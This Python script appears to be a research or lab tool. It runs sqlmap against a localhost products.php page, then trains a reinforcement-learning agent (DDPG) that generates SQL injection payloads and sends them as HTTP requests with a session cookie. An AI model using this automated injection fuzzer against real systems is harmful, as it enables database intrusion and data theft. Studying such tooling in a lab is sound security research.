#!/usr/local/bin/python
import sys
import numpy as np
import requests
from sqlmap_runner import SqlmapRunner
from model.initial_transitions_factory import InitialTransitionsFactory
from sql_parser.token_parser import TokenParser
from sql_parser.sql_data_service import SQLDataService
from model.token_embedder import TokenEmbedder 
from model.ddpg import DDPG
from model.environment import Environment

args = sys.argv[1:]
run_sqlmap = '--no-run-sqlmap' not in args

#
#
# !
# ! TODO: IMPORTANT: Add legal disclaimer.
# !
#
#

BATCH_SIZE = 512

EMBEDDING_DIM = 32

ACTION_SIZE = 10

# TODO: Ensure states do not need to be larger than actions * length of embedding space.
#
# This is the case because an entire action is currently set as
# the prefix of a state.
STATE_SIZE = ACTION_SIZE * EMBEDDING_DIM + 500

OPEN_URL = 'http://localhost/products.php?id='

HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'}
COOKIE = 'pma_lang=en; PHPSESSID=f8ba90a90d120aaafd29a3e52bb08ab9; {flag}=795c7a7a5ec6b460ec00c5841019b9e9'

# TODO: Ensure token parser checks for empty string instead of assuming
# its position at end of descending list.
#
# Must be an empty string due to token parsing in descending alphabetical
# order.
PADDING_TOKEN = ''

# Skips lowercase alphabet as SQL is case-insensitive.
visible_uppercase_chars = [chr(i) for i in range(32, 97)] + \
    [chr(i) for i in range(123, 127)]

sqlmap = SqlmapRunner(OPEN_URL, vulernable_param='id', default_vulnerable_param_value='1')

if run_sqlmap:
    print('Running sqlmap...')
    sqlmap.run(HEADERS, COOKIE)
    print('Attempted payloads gathered from sqlmap.')
else:
    print('Skipping running sqlmap...')

data_service = SQLDataService()

columns = data_service.load_columns()
tables = data_service.load_tables()

sql_tokens = data_service.load_sql_tokens()
token_blacklist = data_service.load_sql_blacklist()

queries = data_service.load_wikisql_queries()
payloads = data_service.load_payload_files(sqlmap.domain_name)

dictionary = [PADDING_TOKEN] + sql_tokens + tables + columns + visible_uppercase_chars

# Remove duplicate characters. For example, visible_uppercase_chars might contain '(',
# which may also be contained in sql_tokens.
dictionary = list(set(dictionary))

dictionary.sort(reverse=True)

token_parser = TokenParser(dictionary, token_blacklist, tokens_per_row=ACTION_SIZE)

print('Encoding queries...')
encoded_queries = token_parser.parse(queries)
print(f'{len(encoded_queries)} queries encoded.')

print('Encoding payloads...')
encoded_payloads = token_parser.parse(payloads)
print(f'{len(encoded_payloads)} payload(s) encoded.')

# TODO: Retrieve cached embeddings (if already generated) if dictionary and
# embedding examples are unchanged.
print('Running token embedder...')
embeddings = TokenEmbedder(EMBEDDING_DIM).learn_embeddings(
    encoded_queries + encoded_payloads, len(dictionary))
print('Embeddings learned.')

headers = HEADERS.copy()
headers.update({'cookie': COOKIE})

environment = Environment(
    dictionary,
    action_size=ACTION_SIZE,
    state_size=STATE_SIZE,
    batch_size=BATCH_SIZE,
    embeddings=embeddings,
    columns=columns,
    tables=tables,
    send_request_callback= lambda payload:
        requests.get(OPEN_URL + payload, headers=headers))
                                         
state: np.ndarray

def print_decoded_injections():
    '''
    Use to verify that the predefined encoded injection list is correctly
    encoded.
    '''
    for injection in encoded_payloads:
        decoded = [dictionary[i] for i in injection]
        print(''.join(decoded))

def main():    
    lstm_units = len(dictionary) * 2

    ddpg = DDPG(
        environment,
        demonstrations_factory=InitialTransitionsFactory(environment, encoded_payloads),
        lstm_units=lstm_units)

    ddpg.run(total_demonstration_steps=1000)

if __name__ == '__main__':
    main()